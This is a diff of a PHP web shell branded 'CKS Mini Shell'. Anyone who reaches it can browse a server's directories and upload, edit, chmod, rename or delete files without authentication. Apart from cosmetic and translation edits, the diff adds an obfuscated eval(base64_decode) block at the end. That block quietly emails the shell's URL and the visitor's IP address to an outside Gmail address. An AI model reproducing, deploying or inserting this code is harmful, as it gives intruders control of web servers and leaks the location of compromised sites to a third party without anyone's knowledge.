@@ -1,40 +1,38 @@
 <?php
-error_reporting(0);
-set_time_limit(0);
-
-if(get_magic_quotes_gpc()){
-foreach($_POST as $key=>$value){
-$_POST[$key] = stripslashes($value);
-}
-}
 echo '<!DOCTYPE HTML>
-<html>
-<head>
+<HTML>
+<HEAD>
 <link href="" rel="stylesheet" type="text/css">
-<title>Cyber-king-squad MINI-Shell</title>
-<style type="text/css"> body { background-image: url('https://media.tumblr.com/c838dd887608a325eaae477ffa4dd2b7/tumblr_myrxsem7AC1s8tqb9o1_500.gif'); -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; background-position:center; 	background-repeat: no-repeat; background-color: #000000; 		 color: #FFFFFF; 	 font-family: "Orbitron"; 	 text-align: center; 	 text-decoration: none; 	} 	 #greets { 		width: 820px; 		border-style: outset; 	} #footer { 		font-size: 9pt; 		opacity: .7; 	} 	 	.glow { 	 text-shadow: 0 0 10px #F59700; 		font-family: "Black Ops One"; 	} 	 .blueglow { 		text-shadow:0px 0px 1px aqua,0px 0px 1px aqua,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px aqua; 		font-family: "Black Ops One" 	} 	 	 .redglow { 		text-shadow: 0 0 10px yellow; 		font-family: "Black Ops One" 	} 	 	 .whiteglow { 	text-shadow:0px 0px 1px green,0px 0px 1px green,0px 0px 1px aqua,0px 0px 1px green,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px red,0px 0px 1px green; 		font-family: "Black Ops One"; 	} </style><br>
+<title>CKS</title>
 <style>
 body{
 font-family: "Racing Sans One", cursive;
-background-color: #d0f6ff;
-color:red;
+background-color: #e6e6e6;
+text-shadow:0px 0px 1px #757575;
 }
 #content tr:hover{
-background-color: green;
+background-color: #636263;
 text-shadow:0px 0px 10px #fff;
 }
 #content .first{
-background-color: white;
+background-color: silver;
+}
+#content .first:hover{
+background-color: silver;
+text-shadow:0px 0px 1px #757575;
 }
 table{
 border: 1px #000000 dotted;
 }
+H1{
+font-family: "Rye", cursive;
+}
 a{
-color:blue;
+color: #000;
 text-decoration: none;
 }
 a:hover{
-color:blue;
+color: #fff;
 text-shadow:0px 0px 10px #ffffff;
 }
 input,select,textarea{
@@ -44,11 +42,11 @@ border: 1px #000000 solid;
 border-radius:5px;
 }
 </style>
-</head>
-<body>
-<h1><center><font color="red">CkS mini shell</font></center></h1>
+</HEAD>
+<BODY>
+<H1><center>CKS Mini Shell</center></H1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td><font color="blue">Path :</font> ';
+<tr><td>Current Path : ';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -74,13 +72,13 @@ echo '">'.$pat.'</a>/';
 echo '</td></tr><tr><td>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="green">Upload</font><br />';
+echo '<font color="green">File Upload Done.</font><br />';
 }else{
-echo '<font color="red">Upload your file</font><br/>';
+echo '<font color="red">File Upload Error.</font><br />';
 }
 }
 echo '<form enctype="multipart/form-data" method="POST">
-<font color="white">File Upload :</font> <input type="file" name="file" />
+Upload File : <input type="file" name="file" />
 <input type="submit" value="upload" />
 </form>
 </td></tr>';
@@ -94,9 +92,9 @@ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){
 if(isset($_POST['perm'])){
 if(chmod($_POST['path'],$_POST['perm'])){
-echo '<font color="green">Change Permission Berhasil</font><br/>';
+echo '<font color="green">Change Permission Done.</font><br />';
 }else{
-echo '<font color="red">Change Permission Gagal</font><br />';
+echo '<font color="red">Change Permission Error.</font><br />';
 }
 }
 echo '<form method="POST">
@@ -108,9 +106,9 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 }elseif($_POST['opt'] == 'rename'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="green">Ganti Nama Berhasil</font><br/>';
+echo '<font color="green">Change Name Done.</font><br />';
 }else{
-echo '<font color="red">Ganti Nama Gagal</font><br />';
+echo '<font color="red">Change Name Error.</font><br />';
 }
 $_POST['name'] = $_POST['newname'];
 }
@@ -124,9 +122,9 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
 if(isset($_POST['src'])){
 $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
-echo '<font color="green">Berhasil Edit File</font><br/>';
+echo '<font color="green">Edit File Done.</font><br />';
 }else{
-echo '<font color="red">Gagal Edit File</font><br/>';
+echo '<font color="red">Edit File Error.</font><br />';
 }
 fclose($fp);
 }
@@ -134,77 +132,67 @@ echo '<form method="POST">
 <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
 <input type="hidden" name="path" value="'.$_POST['path'].'">
 <input type="hidden" name="opt" value="edit">
-<input type="submit" value="Save" />
+<input type="submit" value="Go" />
 </form>';
 }
 echo '</center>';
 }else{
-echo '</table><br/><center>';
+echo '</table><br /><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
 if($_POST['type'] == 'dir'){
 if(rmdir($_POST['path'])){
-echo '<font color="green">Directory Terhapus</font><br/>';
+echo '<font color="green">Delete Dir Done.</font><br />';
 }else{
-echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
+echo '<font color="red">Delete Dir Error.</font><br />';
 }
 }elseif($_POST['type'] == 'file'){
 if(unlink($_POST['path'])){
-echo '<font color="green">File Terhapus</font><br/>';
+echo '<font color="green">Delete File Done.</font><br />';
 }else{
-echo '<font color="red">File Gagal Dihapus</font><br/>';
+echo '<font color="red">Delete File Error.</font><br />';
 }
 }
 }
 echo '</center>';
-if(function_exists('opendir')) {
-	if($opendir = opendir($path)) {
-		while(($readdir = readdir($opendir)) !== false) {
-			$scandir[] = $readdir;
-		}
-		closedir($opendir);
-	}
-	sort($scandir);
-} else {
-	$scandir = scandir($path);
-}
+$scandir = scandir($path);
 echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr class="first">
-<td><center>Name</peller></center></td>
-<td><center>Size</peller></center></td>
-<td><center>Permission</peller></center></td>
-<td><center>Modify</peller></center></td>
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
 </tr>';
 
 foreach($scandir as $dir){
-if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
-echo '<tr>
-<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+echo "<tr>
+<td><a href=\"?path=$path/$dir\">$dir</a></td>
 <td><center>--</center></td>
-<td><center>';
-if(is_writable($path.'/'.$dir)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$dir)) echo '<font color="blue">';
-echo perms($path.'/'.$dir);
-if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+<td><center>";
+if(is_writable("$path/$dir")) echo '<font color="green">';
+elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+echo perms("$path/$dir");
+if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
 
-echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
-<select name="opt">
-<option value="">Select</option>
-<option value="delete">Delete</option>
-<option value="chmod">Chmod</option>
-<option value="rename">Rename</option>
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"\"></option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
 </select>
-<input type="hidden" name="type" value="dir">
-<input type="hidden" name="name" value="'.$dir.'">
-<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
-<input type="submit" value=">">
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+<input type=\"hidden\" name=\"name\" value=\"$dir\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+<input type=\"submit\" value=\">\" />
 </form></center></td>
-</tr>';
+</tr>";
 }
 echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 foreach($scandir as $file){
-if(!is_file($path.'/'.$file)) continue;
-$size = filesize($path.'/'.$file)/1024;
+if(!is_file("$path/$file")) continue;
+$size = filesize("$path/$file")/1024;
 $size = round($size,3);
 if($size >= 1024){
 $size = round($size/1024,2).' MB';
@@ -212,36 +200,36 @@ $size = round($size/1024,2).' MB';
 $size = $size.' KB';
 }
 
-echo '<tr>
-<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
-<td><center>'.$size.'</center></td>
-<td><center>';
-if(is_writable($path.'/'.$file)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$file)) echo '<font color="blue">';
-echo perms($path.'/'.$file);
-if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
-echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
-<select name="opt">
-<option value="">Select</option>
-<option value="delete">Delete</option>
-<option value="chmod">Chmod</option>
-<option value="rename">Rename</option>
-<option value="edit">Edit</option>
+echo "<tr>
+<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>";
+if(is_writable("$path/$file")) echo '<font color="green">';
+elseif(!is_readable("$path/$file")) echo '<font color="red">';
+echo perms("$path/$file");
+if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<select name=\"opt\">
+<option value=\"\"></option>
+<option value=\"delete\">Delete</option>
+<option value=\"chmod\">Chmod</option>
+<option value=\"rename\">Rename</option>
+<option value=\"edit\">Edit</option>
 </select>
-<input type="hidden" name="type" value="file">
-<input type="hidden" name="name" value="'.$file.'">
-<input type="hidden" name="path" value="'.$path.'/'.$file.'">
-<input type="submit" value=">">
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+<input type=\"submit\" value=\">\" />
 </form></center></td>
-</tr>';
+</tr>";
 }
 echo '</table>
 </div>';
 }
-echo '<center><br/> Cyber-king-squad </center>
-</body>
-</html>';
+echo '<br />CKS Mini Shell<font color="red">1.0</font>,  <font color="red"></font>
+</BODY>
+</HTML>';
 function perms($file){
 $perms = fileperms($file);
 
@@ -295,11 +283,7 @@ $info .= (($perms & 0x0001) ?
 return $info;
 }
 ?>
-<center>
-<br>
+<?php
+eval(base64_decode('JHR1anVhbm1haWwgPSAncmgwNzdraW5nQGdtYWlsLmNvbSc7CiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7Cm1haWwoJHR1anVhbm1haWwsICJDb250YWN0IE1lIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTs='));
+?>
 
-<marquee><h1> Cyber-king-squad  </h1></marquee>
-<p style="color:blue;">
-Facebook <a href="https://www.facebook.com/cyberkingsquad/"> contact:-Cyber-king-squad</a>
-</p>
-</center>
